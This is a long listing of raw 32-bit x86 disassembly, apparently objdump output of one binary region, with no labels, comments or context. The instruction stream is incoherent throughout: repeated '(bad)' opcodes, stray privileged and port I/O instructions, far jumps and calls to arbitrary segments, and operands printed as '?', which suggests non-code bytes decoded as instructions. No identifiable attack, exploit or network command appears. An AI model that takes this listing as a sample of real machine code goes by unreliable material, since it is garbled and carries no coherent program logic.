  4109bc:	test   al,0xde
  4109be:	rcr    BYTE PTR [edx-0x6fe65b26],1
  4109c4:	(bad)  
  4109c5:	sahf   
  4109c6:	lds    ebx,FWORD PTR [ebx+ebp*4+0x26]
  4109ca:	outs   dx,BYTE PTR ds:[esi]
  4109cb:	outs   dx,DWORD PTR ds:[esi]
  4109cc:	add    DWORD PTR [edi],ecx
  4109ce:	pushf  
  4109cf:	dec    eax
  4109d0:	or     edi,ebp
  4109d2:	pusha  
  4109d3:	mov    WORD PTR ss:[ebp-0x58],cs
  4109d7:	into   
  4109d8:	inc    esp
  4109d9:	push   0x46eeded3
  4109de:	jbe    0x4109aa
  4109e0:	push   ecx
  4109e1:	sahf   
  4109e2:	mov    ah,0xea
  4109e4:	je     0x410a34
  4109e6:	and    dh,BYTE PTR [eax+0x3e]
  4109e9:	rcl    BYTE PTR [ecx+0x4c],1
  4109ec:	ins    DWORD PTR es:[edi],dx
  4109ed:	mov    DWORD PTR [ecx+0x58],edx
  4109f0:	and    al,0x93
  4109f2:	mov    ds:0x515a20c0,al
  4109f7:	popa   
  4109f8:	(bad)  
  4109f9:	fisub  WORD PTR [ebx]
  4109fb:	ins    BYTE PTR es:[edi],dx
  4109fc:	mov    esi,0x403ad9e7
  410a01:	xor    eax,0xda518437
  410a06:	xor    eax,0x2c958ae0
  410a0b:	clc    
  410a0c:	or     DWORD PTR [eax+0x75fae03a],ecx
  410a12:	enter  0xb851,0x4a
  410a16:	sub    BYTE PTR [eax-0x626ae0d0],ah
  410a1c:	jp     0x410a86
  410a1e:	repz fninit 
  410a21:	jle    0x4109e3
  410a23:	cld    
  410a24:	mov    al,0x1a
  410a26:	jecxz  0x4109d5
  410a28:	push   ss
  410a29:	pop    ebx
  410a2a:	not    BYTE PTR [edi+0xa]
  410a2d:	int    0xc3
  410a2f:	cs push ebp
  410a31:	nop
  410a32:	xlat   BYTE PTR ds:[ebx]
  410a33:	ja     0x410a27
  410a35:	dec    ebx
  410a36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a37:	bound  ecx,QWORD PTR [esi]
  410a39:	clc    
  410a3a:	jne    0x410a6b
  410a3c:	mov    edi,0x969ee3b6
  410a41:	push   edi
  410a42:	jbe    0x410a34
  410a44:	xchg   eax,esi
  410a46:	dec    edx
  410a47:	retf   
  410a48:	push   0xffffffee
  410a4a:	sti    
  410a4b:	ds sbb cl,ch
  410a4e:	sub    eax,esi
  410a50:	sahf   
  410a51:	dec    edi
  410a52:	xor    edx,edx
  410a54:	sbb    ebx,ebx
  410a56:	fistp  DWORD PTR [ebp-0x4f7a8dd3]
  410a5c:	jp     0x410a11
  410a5e:	out    dx,eax
  410a5f:	(bad)  
  410a60:	not    BYTE PTR [edi+ebp*4-0x4b6da65f]
  410a67:	cdq    
  410a68:	pusha  
  410a69:	into   
  410a6a:	jo     0x410a78
  410a6c:	jl     0x410a64
  410a6e:	or     al,0xad
  410a70:	hlt    
  410a71:	fisubr DWORD PTR [eax-0x6747db31]
  410a77:	mov    bh,0xa
  410a79:	push   ebp
  410a7a:	gs icebp 
  410a7c:	iret   
  410a7d:	xor    eax,0x467f4151
  410a82:	inc    edi
  410a83:	mov    ebx,edx
  410a85:	mov    ds:0x82e0a2ad,eax
  410a8a:	push   edi
  410a8b:	js     0x410a6a
  410a8d:	call   0x416e:0x7db7db5a
  410a94:	aam    0x88
  410a96:	inc    esp
  410a97:	inc    edi
  410a98:	shl    DWORD PTR [edi+0x4dd311d6],0xdf
  410a9f:	push   ebp
  410aa0:	pop    edx
  410aa1:	cmp    DWORD PTR [edi-0x6e],esi
  410aa4:	stc    
  410aa5:	xchg   ebp,eax
  410aa6:	adc    DWORD PTR [edx],ebp
  410aa8:	pop    esi
  410aa9:	push   eax
  410aaa:	adc    eax,eax
  410aac:	in     eax,0x64
  410aae:	inc    esi
  410aaf:	sbb    al,0x2b
  410ab1:	dec    edx
  410ab2:	fadd   DWORD PTR [edx-0x23]
  410ab5:	xchg   ebp,eax
  410ab6:	ret    
  410ab7:	(bad)  
  410ab8:	jmp    0x6c8:0x2aadeb89
  410abf:	xchg   DWORD PTR [ebp-0x32],esi
  410ac2:	cmp    ah,BYTE PTR [ebx+0x14]
  410ac5:	mov    esp,0x1bd4362d
  410aca:	add    BYTE PTR [edi+0x6a],0xcf
  410ace:	cdq    
  410acf:	mov    edx,0xcb4bf43
  410ad4:	push   cs
  410ad5:	mov    ebx,0xcba74991
  410ada:	mov    ah,0x0
  410adc:	pop    ecx
  410add:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ade:	aaa    
  410adf:	jg     0x410b27
  410ae1:	pusha  
  410ae2:	fnsave [esi+0x5]
  410ae5:	add    cl,dh
  410ae7:	inc    ebp
  410ae8:	into   
  410ae9:	push   edi
  410aea:	pop    ss
  410aeb:	outs   dx,BYTE PTR ds:[esi]
  410aec:	or     BYTE PTR [eax+eiz*4],bl
  410aef:	call   0x50338096
  410af4:	test   al,cl
  410af6:	test   DWORD PTR [ebx-0x7ac86e1e],0xc2d022e2
  410b00:	or     dh,bh
  410b02:	dec    ebp
  410b03:	xor    DWORD PTR [esi+0xa80313b],0x5b
  410b0a:	push   eax
  410b0b:	in     al,0x71
  410b0d:	jp     0x410b85
  410b0f:	inc    eax
  410b10:	cld    
  410b11:	or     BYTE PTR [eax-0x5adb00a4],0x7
  410b18:	xchg   edx,eax
  410b19:	les    ecx,FWORD PTR [edx+0x49d7b0e9]
  410b1f:	push   ebp
  410b20:	cmp    al,0x1f
  410b22:	inc    esi
  410b23:	push   ss
  410b24:	jns    0x410ac8
  410b26:	dec    ebx
  410b27:	pushf  
  410b28:	pop    edi
  410b29:	popa   
  410b2a:	sti    
  410b2b:	push   ds
  410b2c:	das    
  410b2d:	inc    ecx
  410b2e:	les    eax,FWORD PTR [ebx-0x49]
  410b31:	cmp    DWORD PTR [edi],0xffffffd5
  410b34:	jno    0x410b6e
  410b36:	push   cs
  410b37:	jmp    0x45d6fbb
  410b3c:	in     al,dx
  410b3d:	add    DWORD PTR [edx],eax
  410b3f:	sbb    DWORD PTR [esi],0x15f1c37e
  410b45:	in     al,0xd6
  410b47:	lods   eax,DWORD PTR ds:[esi]
  410b48:	push   0x8b40fdf0
  410b4d:	add    ebp,ecx
  410b4f:	mov    bh,0x1d
  410b51:	data16 ficom WORD PTR [ebp-0x4f]
  410b55:	push   cs
  410b56:	inc    DWORD PTR [edx+edx*2+0x8]
  410b5a:	inc    ecx
  410b5b:	stos   DWORD PTR es:[edi],eax
  410b5c:	fld    DWORD PTR [ecx+0x40]
  410b5f:	jmp    DWORD PTR [ebx-0x4]
  410b62:	aad    0x2e
  410b64:	mov    bl,0x5c
  410b66:	xchg   ebp,eax
  410b67:	cmp    al,0xc6
  410b69:	xchg   ebp,eax
  410b6a:	sbb    edx,DWORD PTR [ebp+edx*1+0x3c]
  410b6e:	enter  0x446c,0x46
  410b72:	adc    ah,dl
  410b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b75:	fs test dl,0x83
  410b79:	ffreep st(0)
  410b7b:	push   edi
  410b7c:	xchg   ecx,eax
  410b7d:	js     0x410b35
  410b7f:	inc    ecx
  410b80:	loope  0x410bab
  410b82:	pop    edx
  410b83:	xchg   DWORD PTR [ebp*8-0x59cd2377],esi
  410b8a:	pop    ecx
  410b8b:	jp     0x410bef
  410b8d:	jbe    0x410bbf
  410b8f:	ins    BYTE PTR es:[edi],dx
  410b90:	mov    esp,0xd6004a9e
  410b95:	iret   
  410b96:	std    
  410b97:	mov    bh,0xee
  410b99:	es xor al,0x6c
  410b9c:	(bad)
  410ba0:	rcl    BYTE PTR [eax+0x6ff0acbe],cl
  410ba6:	pop    ecx
  410ba7:	std    
  410ba8:	sub    al,0xa4
  410baa:	sbb    al,0x59
  410bac:	jle    0x410b58
  410bae:	enter  0x89c,0x48
  410bb2:	mov    edx,0xceefd9d0
  410bb7:	and    BYTE PTR [esi],ah
  410bb9:	pop    edx
  410bba:	jp     0x410b8e
  410bbc:	repz mov ah,0xf9
  410bbf:	mov    dl,0x1c
  410bc1:	or     dh,dl
  410bc3:	xchg   esp,eax
  410bc4:	inc    ecx
  410bc5:	adc    DWORD PTR [edx-0x7a],eax
  410bc8:	hlt    
  410bc9:	mov    dh,0xb9
  410bcb:	fld    DWORD PTR [esi]
  410bcd:	push   edi
  410bce:	or     eax,0x2dfc40c5
  410bd3:	mov    WORD PTR [ebx],cs
  410bd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bd6:	pushf  
  410bd7:	ret    
  410bd8:	test   al,0x64
  410bda:	bound  esi,QWORD PTR [edi+0x40563f0e]
  410be0:	pop    esp
  410be1:	in     al,0x2c
  410be3:	fmul   QWORD PTR [edx+0x68]
  410be6:	push   edx
  410be7:	dec    ebp
  410be8:	dec    esp
  410be9:	and    ecx,DWORD PTR [edx+0x65]
  410bec:	jmp    0x7826f8a8
  410bf1:	xor    ebx,ebp
  410bf3:	xor    eax,ebx
  410bf5:	mov    eax,0x3482c03
  410bfa:	lods   eax,DWORD PTR ds:[esi]
  410bfb:	fbstp  TBYTE PTR [ecx]
  410bfd:	jns    0x410bfa
  410bff:	imul   BYTE PTR [edx-0x45]
  410c02:	aam    0xca
  410c04:	ror    ch,0x67
  410c07:	sub    DWORD PTR [ecx-0x73],eax
  410c0a:	xchg   ecx,eax
  410c0b:	mov    esp,DWORD PTR [esi]
  410c0d:	pop    ecx
  410c0e:	and    eax,ebx
  410c10:	int3   
  410c11:	mov    bl,0x8f
  410c13:	(bad)  
  410c14:	iret   
  410c15:	adc    eax,0xaca3dc02
  410c1a:	mov    esp,0x4910488d
  410c1f:	pop    esi
  410c20:	mov    DWORD PTR [edi+0x57f16b76],edx
  410c26:	mov    bl,0xa4
  410c28:	dec    ecx
  410c29:	lods   eax,DWORD PTR ds:[esi]
  410c2a:	into   
  410c2b:	sbb    ah,dh
  410c2d:	repnz and DWORD PTR ds:0x858faef,ebp
  410c34:	rcr    BYTE PTR [edi-0x22],1
  410c37:	test   al,0x5c
  410c39:	sub    eax,0x24186b21
  410c3e:	test   eax,0x27b6842a
  410c43:	cmp    al,0x80
  410c45:	bound  esi,QWORD PTR [edi]
  410c47:	nop
  410c48:	fnstsw WORD PTR [edx-0x4f01f63d]
  410c4e:	and    bl,BYTE PTR [eax+0x3a]
  410c51:	adc    esp,DWORD PTR [ecx-0x20]
  410c54:	test   BYTE PTR [ecx],cl
  410c56:	(bad)
  410c5a:	out    0xad,al
  410c5c:	jbe    0x410c76
  410c5e:	es lock xor esi,eax
  410c62:	fadd   DWORD PTR [edi-0x42]
  410c65:	leave  
  410c66:	inc    edx
  410c67:	and    DWORD PTR [esi-0x3acb9cb1],eax
  410c6d:	pop    edx
  410c6e:	and    ah,BYTE PTR [eax+0xd]
  410c71:	mov    ebx,0x2387b852
  410c76:	jmp    0x894:0xc40cc50c
  410c7d:	jge    0x410c74
  410c7f:	mov    ds:0x7b0d5aa8,eax
  410c84:	fiadd  WORD PTR [edi]
  410c86:	(bad)  
  410c87:	mov    bl,0xc
  410c89:	xchg   edx,eax
  410c8a:	add    ah,BYTE PTR [esp+edx*8+0x51bc01e8]
  410c91:	scas   al,BYTE PTR es:[edi]
  410c92:	dec    edx
  410c93:	xor    eax,0x4803aab0
  410c98:	dec    esp
  410c99:	cmp    bh,0x75
  410c9c:	ja     0x410c2c
  410c9e:	jae    0x410c53
  410ca0:	mov    ebp,DWORD PTR [ebx-0x35]
  410ca3:	and    ah,dl
  410ca5:	or     BYTE PTR [ebx+0x1c],bh
  410ca8:	popf   
  410ca9:	jbe    0x410c6f
  410cab:	jmp    0x410d01
  410cad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cae:	mov    esi,0x197b71cd
  410cb3:	jno    0x410c6f
  410cb5:	scas   al,BYTE PTR es:[edi]
  410cb6:	call   0xe6f56708
  410cbb:	jo     0x410cd7
  410cbd:	xor    esi,DWORD PTR [ecx]
  410cbf:	iret   
  410cc0:	inc    esi
  410cc1:	ja     0x410ca9
  410cc3:	sbb    BYTE PTR [ebp+0x26],bl
  410cc6:	outs   dx,DWORD PTR ds:[esi]
  410cc7:	sti    
  410cc8:	cli    
  410cc9:	jno    0x410cd8
  410ccb:	sahf   
  410ccc:	aad    0x6d
  410cce:	inc    edi
  410ccf:	jecxz  0x410c8d
  410cd1:	mov    dl,0xdc
  410cd3:	pop    es
  410cd4:	jp     0x410d0f
  410cd6:	test   al,0xd3
  410cd8:	push   ss
  410cd9:	aad    0x3f
  410cdb:	pop    ecx
  410cdc:	mov    bh,BYTE PTR [ebp+0x9e0d202]
  410ce2:	lods   al,BYTE PTR ds:[esi]
  410ce3:	sub    ebp,DWORD PTR [edi]
  410ce5:	nop
  410ce6:	arpl   WORD PTR [eax+0x3aa07f28],ax
  410cec:	dec    ebp
  410ced:	fcomi  st,st(0)
  410cef:	stos   BYTE PTR es:[edi],al
  410cf0:	jecxz  0x410cec
  410cf2:	pop    es
  410cf3:	dec    esi
  410cf4:	call   0x5679:0xd639d840
  410cfb:	mov    cs,WORD PTR es:0x66e7da46
  410d02:	out    0x69,eax
  410d04:	fldcw  WORD PTR [esi-0x1b]
  410d07:	aad    0x56
  410d09:	scas   al,BYTE PTR es:[edi]
  410d0a:	sbb    al,0x9
  410d0c:	and    eax,0x7e9121ed
  410d11:	jmp    0x410cae
  410d13:	sbb    eax,0x51ecf674
  410d18:	mov    esp,0x7d9f3a1b
  410d1d:	xor    DWORD PTR [edi+esi*1+0x26],edi
  410d21:	(bad)  
  410d22:	adc    edx,DWORD PTR [esi+esi*4]
  410d25:	cs inc ebp
  410d27:	mov    ah,0xfc
  410d29:	mov    edi,DWORD PTR [edi+0x28f163a7]
  410d2f:	dec    ecx
  410d30:	(bad)  
  410d31:	sar    BYTE PTR [eax-0x46],0x7
  410d35:	or     DWORD PTR ds:0xa232d32c,edi
  410d3b:	clc    
  410d3c:	push   0x15eca06
  410d41:	test   al,0xac
  410d43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d44:	sub    dl,BYTE PTR [eax+esi*2+0x5edb46ea]
  410d4b:	inc    ecx
  410d4c:	xor    BYTE PTR [edi],dl
  410d4e:	fnstsw WORD PTR [edi-0x7d]
  410d51:	aam    0xb4
  410d53:	jns    0x410d4e
  410d55:	aas    
  410d56:	sar    DWORD PTR ds:0x3ac25487,1
  410d5c:	aam    0xa0
  410d5e:	push   ss
  410d5f:	pop    ecx
  410d60:	aad    0xa0
  410d62:	adc    ebp,DWORD PTR [eax+0x18bdccae]
  410d68:	add    dl,BYTE PTR [esi]
  410d6a:	leave  
  410d6b:	gs cmp eax,ecx
  410d6e:	scas   eax,DWORD PTR es:[edi]
  410d6f:	aas    
  410d70:	scas   eax,DWORD PTR es:[edi]
  410d71:	inc    edi
  410d72:	gs fs cdq 
  410d75:	outs   dx,BYTE PTR ds:[esi]
  410d76:	sub    DWORD PTR [eax],esp
  410d78:	xchg   edi,eax
  410d79:	adc    eax,0x6ec2d3c1
  410d7e:	dec    esp
  410d7f:	icebp  
  410d80:	rcr    BYTE PTR [eax+0x2e],1
  410d83:	addr16 push es
  410d85:	sbb    eax,0xca124942
  410d8a:	dec    edx
  410d8b:	dec    ebp
  410d8c:	imul   edi,DWORD PTR ds:0x434f75bb,0xb1e4167a
  410d96:	sar    BYTE PTR [ebx+ebp*4],cl
  410d99:	sub    eax,0xf4c1a62d
  410d9e:	push   ebp
  410d9f:	lds    eax,FWORD PTR [ecx-0x67]
  410da2:	test   eax,0xcf3d0f8a
  410da7:	repz xchg esi,eax
  410da9:	ja     0x410df9
  410dab:	push   cs
  410dac:	aam    0x72
  410dae:	rcl    BYTE PTR [ebp+0x48f4d2aa],1
  410db4:	sbb    esi,DWORD PTR [ebx+0x3e]
  410db7:	add    cl,BYTE PTR [edi]
  410db9:	lea    ebp,[ebp+0x58]
  410dbc:	test   BYTE PTR [eax+0x7b],0xff
  410dc0:	das    
  410dc1:	adc    al,0xc7
  410dc3:	fist   DWORD PTR [edi-0x5dee1bd2]
  410dc9:	outs   dx,DWORD PTR ds:[esi]
  410dca:	add    eax,0x27a44a4a
  410dcf:	pop    ds
  410dd0:	imul   edi,DWORD PTR [esi+eax*4-0x24],0x4f
  410dd5:	inc    esp
  410dd6:	push   ecx
  410dd7:	(bad)  
  410dd9:	jg     0x410e44
  410ddb:	jl     0x410dc4
  410ddd:	out    dx,eax
  410dde:	push   edi
  410ddf:	jg     0x410dd5
  410de1:	sahf   
  410de2:	sub    edx,DWORD PTR [ebx+eax*4-0x4d]
  410de6:	adc    BYTE PTR [eax+0x46c0691],ah
  410dec:	int    0x31
  410dee:	les    eax,FWORD PTR [esi+0x65]
  410df1:	lods   eax,DWORD PTR ds:[esi]
  410df2:	int    0x7
  410df4:	js     0x410dc1
  410df6:	jecxz  0x410e1d
  410df8:	jle    0x410e26
  410dfa:	call   0x5e9926c5
  410dff:	mov    esi,0x27baa355
  410e04:	arpl   WORD PTR [ebx-0x50],bp
  410e07:	push   ebp
  410e08:	dec    eax
  410e09:	stos   BYTE PTR es:[edi],al
  410e0a:	cmp    ebp,DWORD PTR [eax+0x42]
  410e0d:	push   0x55232448
  410e12:	nop
  410e13:	or     eax,0x88e34f27
  410e18:	shr    BYTE PTR [ecx+0x41f0f7e8],cl
  410e1e:	xchg   edi,eax
  410e1f:	jmp    0x401ec77d
  410e24:	push   edi
  410e25:	add    ch,BYTE PTR [eax+edx*2]
  410e28:	mov    bh,0x64
  410e2a:	popf   
  410e2b:	mov    dl,0xaf
  410e2d:	daa    
  410e2e:	das    
  410e2f:	ins    DWORD PTR es:[edi],dx
  410e30:	push   ebx
  410e31:	dec    ebp
  410e32:	repz ja 0x410e0c
  410e35:	fmul   DWORD PTR [eax]
  410e37:	jp     0x410e48
  410e39:	fst    QWORD PTR [edx-0x6]
  410e3c:	mov    WORD PTR [esi-0x1d8be5b4],ds
  410e42:	in     eax,dx
  410e43:	mov    ebp,0x9fe9c951
  410e48:	cld    
  410e49:	fmul   QWORD PTR [ecx]
  410e4b:	inc    ebx
  410e4c:	jecxz  0x410e09
  410e4e:	pop    ecx
  410e4f:	add    al,0x2e
  410e51:	dec    edi
  410e52:	hlt    
  410e53:	mov    DWORD PTR [ebp+edx*1+0x1c],ecx
  410e57:	fld    DWORD PTR [eax-0x629fe04e]
  410e5d:	pop    ecx
  410e5e:	pop    eax
  410e5f:	imul   esi,DWORD PTR ds:0xc90a22a0,0xffffffaa
  410e66:	int    0x3f
  410e68:	pushf  
  410e69:	into   
  410e6a:	xchg   ebp,eax
  410e6b:	icebp  
  410e6c:	mov    bl,0x33
  410e6e:	inc    esi
  410e6f:	dec    esi
  410e70:	adc    DWORD PTR [ebx+0x6c],eax
  410e73:	(bad)  
  410e74:	jle    0x410e3b
  410e76:	dec    eax
  410e77:	pop    ecx
  410e78:	push   es
  410e79:	mov    ds:0xa1edda1b,eax
  410e7e:	or     BYTE PTR [eax],dl
  410e80:	jg     0x410e1d
  410e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e83:	das    
  410e84:	jb     0x410efe
  410e86:	sbb    eax,0x7d7ed595
  410e8b:	mov    al,BYTE PTR [ebx]
  410e8d:	sti    
  410e8e:	sti    
  410e8f:	aas    
  410e90:	into   
  410e91:	pusha  
  410e92:	(bad)  [ebx+0x39]
  410e95:	arpl   WORD PTR [ebx-0x708db222],dx
  410e9b:	mov    ebx,gs
  410e9d:	push   cs
  410e9e:	xchg   ebx,eax
  410e9f:	repz jae 0x410f18
  410ea2:	mov    ecx,0x1150c81a
  410ea7:	cmp    al,0x6
  410ea9:	xlat   BYTE PTR ds:[ebx]
  410eaa:	mov    ebp,?
  410eac:	adc    dh,BYTE PTR [edx]
  410eae:	loopne 0x410e8c
  410eb0:	add    DWORD PTR [esi+0x12],ebx
  410eb3:	push   ss
  410eb4:	ss dec edi
  410eb6:	ins    DWORD PTR es:[edi],dx
  410eb7:	ss or  eax,0x3dce8a70
  410ebd:	fmul   DWORD PTR [esi-0x78417495]
  410ec3:	cmp    eax,0x3ce013da
  410ec8:	in     eax,dx
  410ec9:	dec    esi
  410eca:	fwait
  410ecb:	call   0x4503:0x88607ee
  410ed2:	dec    eax
  410ed3:	cld    
  410ed4:	inc    edx
  410ed5:	mov    ds:0x53179e85,eax
  410eda:	add    al,0x25
  410edc:	xchg   eax,ebx
  410ede:	push   ebx
  410edf:	mov    dh,0x97
  410ee1:	mov    bl,0xb7
  410ee3:	retf   0x369a
  410ee6:	iret   
  410ee7:	aad    0x93
  410ee9:	and    ebp,DWORD PTR [ebp+0x22]
  410eec:	pop    es
  410eed:	pop    ebp
  410eee:	int3   
  410eef:	out    dx,al
  410ef0:	popf   
  410ef1:	pop    ecx
  410ef2:	fwait
  410ef3:	aam    0x65
  410ef5:	mov    WORD PTR [ebx-0x38],?
  410ef8:	test   cl,cl
  410efa:	push   0xdf010aef
  410eff:	push   eax
  410f00:	enter  0xda2,0x40
  410f04:	mov    al,ds:0x92931962
  410f09:	mov    al,0x83
  410f0b:	lods   eax,DWORD PTR ds:[esi]
  410f0c:	mov    ds:0xcabfe6bb,al
  410f11:	pop    esp
  410f12:	xor    al,0x54
  410f14:	and    ch,0x6
  410f17:	xor    eax,0x62abc6
  410f1c:	pop    esp
  410f1d:	(bad)  
  410f1e:	and    BYTE PTR ds:0xf2b44f96,dl
  410f24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f25:	ror    BYTE PTR [esi+0x66ccc96c],1
  410f2b:	push   cs
  410f2c:	mov    ebp,0xc4804eff
  410f31:	into   
  410f32:	in     eax,dx
  410f33:	imul   eax,esi,0xffffffac
  410f36:	aam    0xaa
  410f38:	adc    al,0x4e
  410f3a:	adc    eax,eax
  410f3c:	loope  0x410ef6
  410f3e:	sub    esi,DWORD PTR [eax-0x2f04b81b]
  410f44:	pop    ebp
  410f45:	jl     0x410eda
  410f47:	xchg   edi,eax
  410f48:	mov    ebx,0x9949e86f
  410f4d:	push   esp
  410f4e:	inc    esi
  410f4f:	xchg   edx,eax
  410f50:	mov    ecx,0x247011ea
  410f55:	aam    0xc9
  410f57:	pop    ebx
  410f58:	scas   al,BYTE PTR es:[edi]
  410f59:	dec    edi
  410f5a:	lods   eax,DWORD PTR ds:[esi]
  410f5b:	test   cl,ah
  410f5d:	in     al,dx
  410f5e:	xor    ecx,DWORD PTR [edi]
  410f60:	mov    edi,0xcada76d3
  410f65:	enter  0xf233,0xb1
  410f69:	sar    ah,1
  410f6b:	ret    0xd889
  410f6e:	pop    edx
  410f6f:	push   ss
  410f70:	retf   0xcb31
  410f73:	mov    al,ds:0xfbcaf71f
  410f78:	adc    DWORD PTR [ebx-0x12811ef3],eax
  410f7e:	shl    BYTE PTR [eax-0xd],cl
  410f81:	addr16 pop edx
  410f83:	out    0xbb,al
  410f85:	outs   dx,BYTE PTR ds:[esi]
  410f86:	das    
  410f87:	ja     0x410fcd
  410f89:	popf   
  410f8a:	push   esp
  410f8b:	jo     0x410fdc
  410f8d:	adc    al,0x91
  410f8f:	aad    0xea
  410f91:	jbe    0x410f9a
  410f93:	mov    eax,0x6cb60b1e
  410f98:	iret   
  410f99:	mov    ah,0xfb
  410f9b:	std    
  410f9c:	cmp    DWORD PTR [edx-0x46],eax
  410f9f:	sbb    DWORD PTR fs:[ebp+0x1dc8afa0],edx
  410fa6:	call   0x76d4:0x5e7f9cbf
  410fad:	loopne 0x410fe9
  410faf:	push   ss
  410fb0:	pop    ebx
  410fb1:	jp     0x410fa3
  410fb3:	add    esp,DWORD PTR ds:0x94646106
  410fb9:	cli    
  410fba:	loopne 0x410f8c
  410fbc:	fld    TBYTE PTR ds:0x4542b71b
  410fc2:	fild   DWORD PTR [ecx+0x5d]
  410fc5:	mov    edx,0xaeb7b157
  410fca:	mov    esp,0xe29fb7a7
  410fcf:	clc    
  410fd0:	pop    es
  410fd1:	call   0xcde089e2
  410fd6:	fist   DWORD PTR [eax]
  410fd8:	dec    edx
  410fd9:	mov    BYTE PTR [esi-0x47],dl
  410fdc:	push   0xffffff9f
  410fde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fdf:	jg     0x410f8b
  410fe1:	inc    edx
  410fe2:	jmp    0x410f84
  410fe4:	pop    ss
  410fe5:	aam    0x7
  410fe7:	cs push esp
  410fe9:	sar    BYTE PTR cs:[ebx],0xc2
  410fed:	dec    esp
  410fee:	and    BYTE PTR [eax-0x2265c86f],dl
  410ff4:	jmp    DWORD PTR [edx]
  410ff6:	lahf   
  410ff7:	xchg   esi,ecx
  410ff9:	jae    0x410fa7
  410ffb:	scas   eax,DWORD PTR es:[edi]
  410ffc:	mov    al,0xe6
  410ffe:	test   al,0xf9
  411000:	data16 je 0x410fe9
  411003:	pop    esi
  411004:	mov    al,0x40
  411006:	shl    DWORD PTR [ebx],0x86
  411009:	adc    al,0x39
  41100b:	push   es
  41100c:	mov    edi,0x85fa9ff3
  411011:	loopne 0x410fe4
  411013:	hlt    
  411014:	dec    ebp
  411015:	jne    0x410fd1
  411017:	push   0x53
  411019:	(bad)  
  41101b:	jae    0x9b680de9
  411021:	retf   0x778a
  411024:	cmc    
  411025:	inc    ebp
  411026:	and    BYTE PTR [edi],ah
  411028:	call   0x6d05:0x807f0459
  41102f:	push   cs
  411030:	icebp  
  411031:	aas    
  411032:	cmp    DWORD PTR ds:0xd6bf21ee,eax
  411038:	cmp    eax,0x9d41b70
  41103d:	cs mov ebx,0xc3216488
  411043:	clc    
  411044:	xor    eax,0x5e62b653
  411049:	es mov ch,0xc2
  41104c:	push   eax
  41104d:	push   ebx
  41104e:	jg     0x410ff7
  411050:	pop    ebx
  411051:	test   BYTE PTR [edi],ah
  411053:	shl    edi,cl
  411055:	push   ecx
  411056:	jmp    0x7295:0xc121e40b
  41105d:	(bad)  
  41105e:	xchg   esp,eax
  41105f:	add    ebp,0x562f0303
  411065:	push   ss
  411066:	loopne 0x411012
  411068:	out    dx,al
  411069:	cs mov ?,ebp
  41106c:	lahf   
  41106d:	mov    ch,0xbe
  41106f:	dec    ebx
  411070:	jle    0x410ffe
  411072:	push   0xd3e80be5
  411077:	push   edi
  411078:	fsub   QWORD PTR [ebx-0x131d8ef9]
  41107e:	mov    ebp,0x518c4e3e
  411083:	xchg   esp,eax
  411084:	jl     0x411033
  411086:	inc    edi
  411087:	imul   dh
  411089:	fcomp  st(1)
  41108b:	shl    dh,0x6a
  41108e:	outs   dx,BYTE PTR ds:[esi]
  41108f:	std    
  411090:	in     eax,0x6a
  411092:	loop   0x4110ab
  411094:	dec    edi
  411095:	(bad)  
  411096:	stos   BYTE PTR es:[edi],al
  411097:	and    BYTE PTR [eax],0x89
  41109a:	inc    edx
  41109b:	in     al,dx
  41109c:	inc    ebx
  41109d:	jno    0x4110f9
  41109f:	inc    ecx
  4110a0:	sub    DWORD PTR [ecx+0x9],edi
  4110a3:	fwait
  4110a4:	sbb    DWORD PTR [esi+0x0],ebp
  4110a7:	cmp    eax,DWORD PTR [ecx+edx*2+0x56a14b5c]
  4110ae:	inc    edi
  4110af:	pop    edx
  4110b0:	lea    edx,[ecx-0x128df1db]
  4110b6:	(bad)  
  4110b7:	jmp    0xf49a:0xa3393afb
  4110be:	fsub   QWORD PTR [ebp-0x4f]
  4110c1:	ds leave 
  4110c3:	sbb    DWORD PTR [eax+0x3f],0xffffffb8
  4110c7:	imul   ebx,esp,0xffffffef
  4110ca:	xlat   BYTE PTR ds:[ebx]
  4110cb:	and    BYTE PTR [ecx+0x13],al
  4110ce:	xlat   BYTE PTR ds:[ebx]
  4110cf:	lock dec eax
  4110d1:	into   
  4110d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110d3:	jmp    0x411136
  4110d5:	xchg   esi,eax
  4110d6:	sub    ecx,DWORD PTR [eax]
  4110d8:	scas   al,BYTE PTR es:[edi]
  4110d9:	push   edi
  4110da:	mov    ds:0x7e47cb7b,eax
  4110df:	add    al,0xb4
  4110e1:	pop    esi
  4110e2:	std    
  4110e3:	popa   
  4110e4:	pop    edx
  4110e5:	xchg   esi,eax
  4110e6:	mov    ecx,0x2d1fdc2e
  4110eb:	dec    edx
  4110ec:	mov    dh,BYTE PTR ds:0x288de4c9
  4110f2:	out    dx,eax
  4110f3:	pop    ecx
  4110f4:	arpl   di,sp
  4110f6:	(bad)  
  4110f7:	pop    esi
  4110f8:	inc    esp
  4110f9:	xor    BYTE PTR [edi-0x54],dh
  4110fc:	push   edx
  4110fd:	jp     0x411119
  4110ff:	xor    al,0xe3
  411101:	push   es
  411102:	sub    eax,0xda5f16ee
  411107:	cli    
  411108:	jae    0x411173
  41110a:	shr    BYTE PTR gs:[ebp-0x1c],0xb5
  41110f:	jecxz  0x411161
  411111:	cs jmp 0x4110a8
  411114:	mov    cl,0xb4
  411116:	push   edx
  411117:	stos   BYTE PTR es:[edi],al
  411118:	adc    DWORD PTR [edi],ebp
  41111a:	mov    bl,ah
  41111c:	cmp    edx,DWORD PTR [ebp-0x64]
  41111f:	mov    ch,0xef
  411121:	and    ch,ah
  411123:	stos   BYTE PTR es:[edi],al
  411124:	imul   edi,DWORD PTR [esi],0xffffffcf
  411127:	dec    eax
  411128:	imul   eax,DWORD PTR [esi+0x2e66c6cc],0xffffffff
  41112f:	mov    es,WORD PTR [eax]
  411131:	push   esp
  411132:	dec    eax
  411133:	pop    esp
  411134:	(bad)  
  411135:	sub    al,0x3e
  411137:	popa   
  411138:	jno    0x411193
  41113a:	in     al,0x3e
  41113c:	push   0xffffffcd
  41113e:	popa   
  41113f:	jo     0x4111a1
  411141:	inc    esi
